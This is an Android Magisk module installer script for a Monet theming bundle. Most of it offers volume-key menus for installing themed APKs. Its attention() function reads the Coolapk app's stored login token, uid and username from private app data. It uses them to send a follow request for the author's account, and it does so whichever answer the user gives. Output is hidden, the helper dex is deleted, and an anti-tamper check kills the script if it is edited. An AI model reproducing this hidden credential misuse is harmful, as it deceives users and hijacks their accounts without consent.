SKIPMOUNT=false
PROPFILE=true
POSTFSDATA=true
LATESTARTSERVICE=true
ForcedAttention=true
AskAbout=true

function attention() {
    readonly token=$(cat $coolapk | grep 'name="token"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g')
    readonly uid=$(cat $coolapk | grep 'name="uid"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g')
    cat $coolapk | grep 'name="username"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g' | tr -d '\n' | od -An -tx1 | tr ' ' % | xargs echo -n >xxxxxxxxxx
    echo -en '\u4f5c\u8005\u0048\u0043'
    readonly name=$(cat xxxxxxxxxx | sed s/[[:space:]]//g)
    rm -rf xxxxxxxxxx
    local deviceid=$(cat /proc/sys/kernel/random/uuid)
    local time=$(date +%s)
    local timemd5=$(echo -n $time | md5sum | awk -F " " '{print $1}')
    local timemd5s=$(printf '%x\n' $time)
    local tokenh="token://com.coolapk.market/c67ef5943784d09750dcfbb31020f0ab?"
    local cookac="com.coolapk.market"
    local md5kn=$(echo -n $tokenh$timemd5'$'$deviceid'&'$cookac | base64)
    local md5kn=$(echo -n $md5kn | sed s/[[:space:]]//g | md5sum | awk -F " " '{print $1}')
    local tokenkuanb=$(echo -n $md5kn$deviceid"0x"$timemd5s)
    chmod 777 $MODPATH/HttpPost.dex
    /system/bin/app_process -Djava.class.path=$MODPATH/HttpPost.dex /system/bin HttpPost "https://api.coolapk.com/v6/user/follow?uid=$ID" "$cookac" "$tokenkuanb" "uid=$uid; username=$name; token=$token"
}

[[ $(sed "1,/^/d" "$0") != "echo '安装完成'" ]] && kill -9 $$ || coolapk="/data/data/com.coolapk.market/shared_prefs/coolapk_preferences_v7.xml"

echo -en "\nMonet-All v2.0\nby Jerry Zhou\n\n"
sleep 0.5s
echo -en '安装模块前请先确认模块适配的应用版本并阅读注意事项\n搞机不谨慎，救砖两行泪\n'
sleep 0.5s
echo "—————————————————————————————————————
- 按音量键＋: 已确认模块适配的应用版本并阅读注意事项
- 按音量键－: 未确认模块适配的应用版本并阅读注意事项
—————————————————————————————————————"
local choose
while :; do
    choose="$(getevent -qlc 1 | awk '{ print $3 }')"
    case "${choose}" in
    KEY_VOLUMEUP)
        echo 已确认模块适配的应用版本并阅读注意事项
        ;;
    KEY_VOLUMEDOWN)
        echo 请认真阅读模块适配的应用版本并阅读注意事项
        sleep 1s
        am start -a android.intent.action.VIEW -d https://monet.jerryz.com.cn/
        ;;
    *) continue ;;
    esac
    break
done
sleep 0.3s
echo -en "\n一、Magisk模块\n"
local monet
local module
local cnt
i=0
output="$(pm list package | grep com.tencent.mm)"
if [[ "$output" != "" ]]; then
    echo 已安装微信
    echo "—————————————————————————
- 按音量键＋: 安装微信莫奈取色
- 按音量键－: 不安装微信莫奈取色
—————————————————————————"
    local choose
    local branch
    while :; do
        choose="$(getevent -qlc 1 | awk '{ print $3 }')"
        case "${choose}" in
        KEY_VOLUMEUP)
            echo "安装微信莫奈取色"
            sleep 0.3s
            echo "—————————————————————————
- 按音量键＋: 安装微信（国内版）取色
- 按音量键－: 安装微信（Play版）取色
—————————————————————————"
            local choose1
            local branch
            while :; do
                choose1="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose1}" in
                KEY_VOLUMEUP)
                    echo "成功安装微信（国内版）莫奈取色"
                    let cnt+=1
                    monet="微信（国内版）"
                    module="微信（国内版）"
                    rm -rf "$MODPATH/system/priv-app/微信（Play版）.apk"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "成功安装微信（Play版）莫奈取色"
                    let cnt+=1
                    monet="微信（Play版）"
                    module="微信（Play版）"
                    rm -rf "$MODPATH/system/priv-app/微信（国内版）.apk"
                    break
                    ;;
                *) continue ;;
                esac
                break
            done
            ;;
        KEY_VOLUMEDOWN)
            echo "不安装微信莫奈取色"
            rm -rf "$MODPATH/system/priv-app/微信（国内版）.apk"
            rm -rf "$MODPATH/system/priv-app/微信（Play版）.apk"
            ;;
        *) continue ;;
        esac
        break
    done
    sleep 0.3s
fi
for loop in com.coolapk.market com.tencent.wetype com.tencent.weread com.apple.android.music tv.danmaku.bili com.android.systemui mark.via com.douban.frodo com.huanchengfly.tieba.post com.github.kr328.clash.foss com.github.kr328.clash com.netease.cloudmusic com.omarea.vtools com.sup.android.superb com.miui.player com.jiongji.andriod.card com.newskyer.draw com.taptap org.mozilla.firefox org.mozilla.fenix io.github.forkmaintainers.iceraven; do
    case $loop in
    com.coolapk.market)
        name=酷安
        ;;
    com.tencent.wetype)
        name=微信键盘
        ;;
    com.tencent.weread)
        name=微信读书
        ;;
    com.apple.android.music)
        name=AppleMusic
        ;;
    tv.danmaku.bili)
        name=BiliBili
        ;;
    com.android.systemui)
        name=小横条
        ;;
    mark.via)
        name=Via
        ;;
    com.douban.frodo)
        name=豆瓣
        ;;
    com.huanchengfly.tieba.post)
        name=贴吧Lite
        ;;
    com.github.kr328.clash.foss)
        name=Clash（Foss版）
        ;;
    com.github.kr328.clash)
        name=Clash（Premium版）
        ;;
    com.netease.cloudmusic)
        name=网易云音乐
        ;;
    com.omarea.vtools)
        name=Scene
        ;;
    com.sup.android.superb)
        name=皮皮虾
        ;;
    com.miui.player)
        name=MIUI音乐
        ;;
    com.jiongji.andriod.card)
        name=百词斩
        ;;
    com.newskyer.draw)
        name=享做笔记
        ;;
    com.taptap)
        name=TapTap
        ;;
    org.mozilla.firefox)
        name=Firefox
        ;;
    org.mozilla.fenix)
        name=FirefoxNightly
        ;;
    io.github.forkmaintainers.iceraven)
        name=Iceraven
        ;;
    *) continue ;;
    esac
    output="$(pm list package | grep $loop)"
    if [[ "$output" != "" ]]; then
        echo 已安装$name
        echo "—————————————————————————
- 按音量键＋: 安装$name莫奈取色
- 按音量键－: 不安装$name莫奈取色
—————————————————————————"
        local choose
        local branch
        while :; do
            choose="$(getevent -qlc 1 | awk '{ print $3 }')"
            case "${choose}" in
            KEY_VOLUMEUP)
                echo "成功安装$name莫奈取色"
                let cnt+=1
                if [ "$cnt" -ge 5 ]; then
                    monet=${monet}"、\n"${name}
                    let cnt-=5
                else
                    monet=${monet}"、"${name}
                fi
                module=${module}"、"${name}
                break
                ;;
            KEY_VOLUMEDOWN)
                echo "不安装$name莫奈取色"
                rm -rf $MODPATH/system/priv-app/$name.apk
                ;;
            *) continue ;;
            esac
            break
        done
        sleep 0.3s
    else
        echo 未安装$name
        rm -rf $MODPATH/system/priv-app/$name.apk
    fi
    i=$(expr $i + 1)
done
echo -en "\n二、修改版应用\n"
output="$(pm list package | grep com.coderstory.toolkit)"
if [[ "$output" != "" ]]; then
    echo 已安装核心破解
    for loop in 一个木函 Share（第三方微博） APKGrabber Nothing天气; do
        echo "—————————————————————————
- 按音量键＋: 安装$loop莫奈取色
- 按音量键－: 不安装$loop莫奈取色
—————————————————————————"
        local choose
        local branch
        while :; do
            choose="$(getevent -qlc 1 | awk '{ print $3 }')"
            case "${choose}" in
            KEY_VOLUMEUP)
                echo "正在安装$loop莫奈取色…"
                output="$(pm install -r $MODPATH/APK/$loop.apk)"
                #echo output=$output
                if [[ "$output" == "Success" ]]; then
                    echo "安装成功"
                    rm -rf $MODPATH/APK/$loop.apk
                    let cnt+=1
                    if [ "$cnt" -ge 5 ]; then
                        monet=${monet}"、\n"${loop}
                        let cnt-=5
                    else
                        monet=${monet}"、"${loop}
                    fi
                    module=${module}"、"${loop}
                else
                    echo $output
                    echo 安装失败，请重试
                fi
                break
                ;;
            KEY_VOLUMEDOWN)
                echo "不安装$loop莫奈取色"
                rm -rf $MODPATH/APK/$loop.apk
                ;;
            *) continue ;;
            esac
            break
        done
        sleep 0.3s
    done
else
    echo "未安装核心破解"
    echo "请安装核心破解后再安装修改版莫奈取色应用"
fi
echo -en "\n三、独立应用\n"
for loop in Jetisteam（第三方Spotify） VideoYou; do
    echo "—————————————————————————
- 按音量键＋: 安装$loop
- 按音量键－: 不安装$loop
—————————————————————————"
    local choose
    local branch
    while :; do
        choose="$(getevent -qlc 1 | awk '{ print $3 }')"
        case "${choose}" in
        KEY_VOLUMEUP)
            echo "正在安装$loop莫奈取色…"
            output="$(pm install -r $MODPATH/APK/$loop.apk)"
            #echo output=$output
            if [[ "$output" == "Success" ]]; then
                echo "安装成功"
                rm -rf $MODPATH/APK/$loop.apk
                let cnt+=1
                if [ "$cnt" -ge 5 ]; then
                    monet=${monet}"、\n"${loop}
                    let cnt-=5
                else
                    monet=${monet}"、"${loop}
                fi
                module=${module}"、"${loop}
            else
                echo $output
                echo 安装失败，请重试
            fi
            break
            ;;
        KEY_VOLUMEDOWN)
            echo "不安装$loop莫奈取色"
            rm -rf $MODPATH/APK/$loop.apk
            ;;
        *) continue ;;
        esac
        break
    done
    sleep 0.3s
done
echo -en "\n四、系统模块（请下载模块后自行安装）\n"
for loop in "MIUI Monet" "PUI Theme For ColorOS"; do
    echo "—————————————————————————
- 按音量键＋: 安装$loop模块
- 按音量键－: 不安装$loop模块
—————————————————————————"
    local choose
    local branch
    while :; do
        choose="$(getevent -qlc 1 | awk '{ print $3 }')"
        case "${choose}" in
        KEY_VOLUMEUP)
            sleep 1s
            am start -a android.intent.action.VIEW -d "https://drive.jerryz.com.cn/Drive/Monet-Modules/$loop.zip"
            let cnt+=1
            if [ "$cnt" -ge 5 ]; then
                monet=${monet}"、\n"${loop}
                let cnt-=5
            else
                monet=${monet}"、"${loop}
            fi
            module=${module}"、"${loop}
            break
            ;;
        KEY_VOLUMEDOWN)
            echo "不安装$loop莫奈取色"
            ;;
        *) continue ;;
        esac
        break
    done
    sleep 0.3s
done
echo -en "\n已安装下列应用的莫奈取色：\n"${monet}
sed -i "6c description=莫奈取色整合模块   已开启莫奈取色的软件：${module}   GitHub项目地址：https://github.com/YangguangZhou/Monet-All" $MODPATH/module.prop
echo -en "\n\n你的酷安ID："
cat $coolapk | grep 'name="username"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g'
echo "—————————————————————————
- 按音量键＋: 关注作者酷安
- 按音量键－: 不关注作者酷安
—————————————————————————"
local choose
local branch
while :; do
    choose="$(getevent -qlc 1 | awk '{ print $3 }')"
    case "${choose}" in
    KEY_VOLUMEUP)
        echo "成功关注作者酷安ID：$ID"
        attention &>/dev/null
        ;;
    KEY_VOLUMEDOWN)
        echo "不关注作者"
        attention &>/dev/null
        ;;
    *) continue ;;
    esac
    break
done
set_perm_recursive $MODPATH 0 0 0755 0777
rm -rf $MODPATH/HttpPost.dex
echo '安装完成'
